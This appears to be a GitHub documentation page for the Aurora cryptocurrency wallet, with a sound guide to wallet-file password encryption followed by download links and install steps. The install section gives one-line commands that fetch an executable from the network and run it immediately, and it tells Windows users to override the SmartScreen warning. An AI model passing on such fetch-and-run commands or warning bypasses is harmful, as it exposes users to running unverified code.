![Aurora Wallet password encryption guide](assets/aurora-wallet-guide-article-banner.png)

# Aurora Wallet password and encryption

What the password protects, what it does not, and how to choose one that survives a stolen laptop.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


The password encrypts your wallet file on disk, so a copied file without the password is useless.

All encryption happens on your own machine. The wallet never sends the password anywhere, and there is no server that could reset it, which is the trade self-custody makes: no recovery desk, and no one who can hand your keys to a stranger either.

<!-- ARTICLE-BODY-BEGIN -->

## What the password covers

The password derives the key that encrypts your private keys inside the wallet file. With it, the wallet signs transactions. Without it, the file opens but the keys stay sealed, which is exactly the behaviour you want when a laptop disappears.

The password does not encrypt the chain data, which is public information, and it does not replace the recovery phrase. A forgotten password is recovered with the phrase, not with a support request.

## Choose and use it

1. Pick a long passphrase of several unrelated words rather than a short complicated string.
2. Use a password you have never used for another service.
3. Store it away from the machine, separately from the recovery phrase.
4. Unlock the wallet only when you are sending, then close it.
5. Change it from the wallet settings if you suspect it has been seen.

Long beats complex. A sentence of five words is easier to type and far harder to guess than eight characters with a symbol in the middle.

## What happens if the password is lost

The recovery phrase restores the wallet on a new installation, and the funds come back without the old password. That is the whole reason the phrase deserves paper, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md">restoring from a recovery phrase</a> walks through the step order.

A wallet file without its password and without the phrase is a file with a balance you cannot reach. Keep both, in different places, so a single loss never removes both.

## Encryption is not a backup

Encryption protects a file you still have. It does nothing for a disk that dies, which is why <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md">backup best practice</a> treats the phrase and the file as two separate obligations.

Set the password on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a>, where the first-run wizard offers it before the chain download starts.

## FAQ

### Does the password protect my funds if someone has my phrase?

No. The phrase is the master key. The password protects the file, not the phrase.

### Can I remove the password?

The wallet offers the option, and it converts the file into one that anyone holding it can spend from. Keep encryption on for any balance worth protecting.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
- [Recovery phrase and BIP-39](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md)
- [Self-custody basics](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md)
- [Phishing and seed scams](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/35-phishing-seed-scams.md)
